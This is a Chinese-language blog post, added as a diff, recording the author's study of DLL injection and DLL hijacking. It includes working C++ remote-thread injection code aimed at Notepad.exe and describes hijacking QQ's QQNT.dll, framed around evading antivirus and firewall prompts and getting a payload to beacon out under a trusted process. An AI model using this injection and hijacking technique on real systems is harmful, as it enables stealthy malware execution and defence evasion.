@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Dawn Nine学习笔记
+    </title>
+    <meta name="description" content=  >
+    <meta name="keywords" content= Dawn Nine,代码学习 >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            DLL注入和劫持
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="DLL注入和劫持"><a href="#DLL注入和劫持" class="headerlink" title="DLL注入和劫持"></a>DLL注入和劫持</h1><h2 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h2><p>常规的loader有五种。1、指针执行；2、申请动态内存；3、嵌入汇编4；、强制类型转换；5、汇编花指令。这五种方式都是通过编译打包成一段exe程序，双击exe程序直接进行执行。运行在任务管理器中会多一个进程，杀毒软件对独立的 .exe 文件监控最严，独立的 .exe 第一次联网时，Windows 防火墙通常会弹出警告询问用户，缺点特别明显，极其容易暴露。</p>
+<h2 id="DLL概念和用途"><a href="#DLL概念和用途" class="headerlink" title="DLL概念和用途"></a>DLL概念和用途</h2><p><strong>dll</strong>(dynamic-link library),动态链接库，是微软实现共享函数库的一种方式。动态链接，就是把一些常用的函数代码制作成dll文件，当某个程序调用到dll中的某个函数的时候，windows系统才把dll加载到内存中。也就是说当程序需要的时候才链接dll，所以是动态链接。</p>
+<p>用途：动态链接的好处是磁盘和内存的消耗减少，这也是dll的最初目的。同时dll也提供了模块化的函数库。</p>
+<h3 id="EXE和DLL"><a href="#EXE和DLL" class="headerlink" title="EXE和DLL"></a>EXE和DLL</h3><p>EXE 和 DLL 都是 PE 文件，它们的区别在于文件头中的标记位。DLL 被调用的模式主要分为 <strong>静态加载</strong> 和 <strong>动态加载</strong>。</p>
+<h4 id="静态加载-利用点劫持"><a href="#静态加载-利用点劫持" class="headerlink" title="静态加载(利用点劫持)"></a>静态加载(利用点劫持)</h4><p>这种模式发生在 <strong>进程初始化阶段</strong>。<strong>机制原理</strong>，当一个 EXE 启动时，Windows 的 <strong>PE 加载器</strong> 会首先读取 EXE 文件头中的 <strong>引入表</strong>。引入表明确列出了该程序依赖的所有 DLL 名称（如 <code>kernel32.dll</code>, <code>user32.dll</code>）以及需要调用的函数名称或序号。</p>
+<h5 id="静态执行流程"><a href="#静态执行流程" class="headerlink" title="静态执行流程"></a><strong>静态执行流程</strong></h5><ol>
+<li><strong>映射文件</strong>：加载器将 EXE 映射到内存。</li>
+<li><strong>解析依赖</strong>：加载器扫描引入表，发现缺失的 DLL。</li>
+<li><strong>加载 DLL</strong>：加载器在系统目录中找到这些 DLL，将它们映射到进程的虚拟地址空间。</li>
+<li><strong>地址修正</strong>：加载器将 DLL 中函数的实际内存地址填入 EXE 的 <strong>引入地址表</strong> 中。</li>
+<li><strong>启动执行</strong>：所有依赖的 DLL 加载完毕后，EXE 的入口点才被执行。</li>
+</ol>
+<h4 id="动态加载模式-利用点注入"><a href="#动态加载模式-利用点注入" class="headerlink" title="动态加载模式(利用点注入)"></a><strong>动态加载模式</strong>(利用点注入)</h4><p>这种模式发生在 <strong>进程运行阶段</strong>。<strong>机制原理</strong>，程序在运行时，通过调用 Windows API 显式地请求操作系统加载 DLL。此时，DLL 的文件路径是一个字符串变量，而不是写在文件头的引入表里。</p>
+<h5 id="动态执行流程"><a href="#动态执行流程" class="headerlink" title="动态执行流程"></a><strong>动态执行流程</strong></h5><ol>
+<li><strong>请求加载</strong>：程序执行到特定逻辑时，调用 <code>LoadLibrary</code> 或 <code>LoadLibraryEx</code>。</li>
+<li><strong>内存映射</strong>：操作系统内核将该 DLL 映射到当前进程的地址空间（如果该 DLL 尚未加载）。</li>
+<li><strong>获取地址</strong>：程序调用 <code>GetProcAddress</code>，传入 DLL 的句柄和函数名。系统会在 DLL 的 <strong>导出表</strong> 中查找该函数的内存地址并返回。</li>
+<li><strong>函数调用</strong>：程序通过函数指针调用该地址。</li>
+<li><strong>卸载</strong>：使用完毕后，调用 <code>FreeLibrary</code> 减少引用计数，从内存中卸载 DLL。</li>
+</ol>
+<h3 id="DLL代码"><a href="#DLL代码" class="headerlink" title="DLL代码"></a>DLL代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一共有三个参数<code>hModule</code>DLL的基址,<code>ul_reason_for_call</code>被调用的原因对应switch的四个选项于1、启动进程；2、终止进程；3、创建线程；4、终止线程。lpReserved，动态加载为 <strong>NULL</strong>，静态加载为非 NULL。</p>
+<h3 id="DLL优点"><a href="#DLL优点" class="headerlink" title="DLL优点"></a>DLL优点</h3><p>DLL会寄生在已经运行的一个程序中，不会另外新起一个进程。如果 DLL 注入到了一个已经被防火墙信任的进程（比如浏览器或系统组件）中，它发出的网络流量通常会被防火墙视为该合法进程的流量，从而直接放行，不会弹窗报警。</p>
+<h2 id="DLL注入-动态加载"><a href="#DLL注入-动态加载" class="headerlink" title="DLL注入(动态加载)"></a>DLL注入(动态加载)</h2><p>让程序加载一个DLL，有LoadLibraryW函数。</p>
+<blockquote>
+<p>LoadLibraryW将指定的模块加载到调用进程的地址空间中。指定的模块可能会加载其他模块。</p>
+</blockquote>
+<h3 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h3><p>1、打开进程获取句柄；2、申请shell coder空间；3、写入内存；4、获取LoadLibraryW；5、创建线程；6、等待线程结束；7、释放dll；8、关闭进程句柄</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessID</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* processName)</span> <span class="comment">// 获取进程ID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (snapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	pe<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(pe32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;pe32))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">wcscmp</span>(pe<span class="number">32.</span>szExeFile, processName) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				DWORD pid = pe<span class="number">32.</span>th32ProcessID;</span><br><span class="line">				<span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">				<span class="keyword">return</span> pid;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;pe32));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">RemoteThreadInject</span><span class="params">(DWORD Pid, LPCWSTR DllName)</span> <span class="comment">// 注入进程</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line">	DWORD DllAddr = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 1.打开进程</span></span><br><span class="line">	HANDLE hprocess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">	<span class="keyword">if</span> (hprocess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	size = (<span class="built_in">wcslen</span>(DllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">	<span class="comment">// 2.申请shell coder空间</span></span><br><span class="line">	LPVOID pAllocMemory = <span class="built_in">VirtualAllocEx</span>(hprocess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pAllocMemory == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 3.写入内存</span></span><br><span class="line">	BOOL Write = <span class="built_in">WriteProcessMemory</span>(hprocess, pAllocMemory, DllName, size, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!Write)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 4.获取LoadLibrary - kenrel32.dll	获取LoadLibraryW函数内存位置</span></span><br><span class="line">	FARPROC pThread = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>),<span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;</span><br><span class="line">	<span class="comment">// 5.创建线程</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hprocess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, pAllocMemory, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 6.等待线程结束</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">// 7.释放dll</span></span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hprocess, pAllocMemory, size, MEM_DECOMMIT);</span><br><span class="line">	<span class="comment">// 8.关闭进程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hprocess);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD PID = <span class="built_in">GetProcessID</span>(<span class="string">L&quot;Notepad.exe&quot;</span>);</span><br><span class="line">	<span class="built_in">RemoteThreadInject</span>(PID, <span class="string">L&quot;C:\\Users\\wm131\\Documents\\Visual Studio 2015\\Projects\\Mydll\\x64\\Release\\Mydll.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入前Notepad调用DLL</p>
+<p><img src="/2026/04/11/DLL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%AB%E6%8C%81/image-20260412010340096.png" alt="image-20260412010340096"></p>
+<p>注入后调用DLL</p>
+<p><img src="/2026/04/11/DLL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%AB%E6%8C%81/image-20260412010222084.png" alt="image-20260412010222084"></p>
+<p><img src="/2026/04/11/DLL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%AB%E6%8C%81/image-20260411235808573.png" alt="image-20260411235808573"></p>
+<p>注入成功已经成功上线，进程名称为Notepad。</p>
+<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="劫持思路"><a href="#劫持思路" class="headerlink" title="劫持思路"></a>劫持思路</h3><p>找到exe启动时自己加载的一个dll，把这个dll替换成你自己写的dll。这个地方有一个问题，如果exe程序要调用这个dll里面的某个函数时，因为这个dll已经被你替换了，你写的这个dll没有这个功能会缺失，启动的时候调用某个功能，功能缺失会导致程序起不来，下面有演示。</p>
+<p>可能还会遇到没有导入表，导致无法调用，这个时候就要加上这个原本的DLL的导入函数。</p>
+<blockquote>
+<p>extern “C” __declspec(dllexport) void 导出函数名()</p>
+</blockquote>
+<p><img src="/2026/04/11/DLL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%AB%E6%8C%81/image-20260412142725445.png" alt="image-20260412142725445"></p>
+<p>通过分析发现这个QQNT.dll是一定加载的，直接替换成自己写的dll名字改成QQNT.dll。运行qq后发现计算器弹出来了，但是qq.exe没有运行起来，说明这个启动的功能缺失了。<img src="/2026/04/11/DLL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%AB%E6%8C%81/image-20260412144319609.png" alt="image-20260412144319609"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没有我想想中的那么难，重点就是思路，DLL注入的难点开始没有理解LoadLibraryW函数。没有构思出来这个的调用逻辑，卡了好久还是Windows函数不是很熟。</p>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Dawn Nine | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
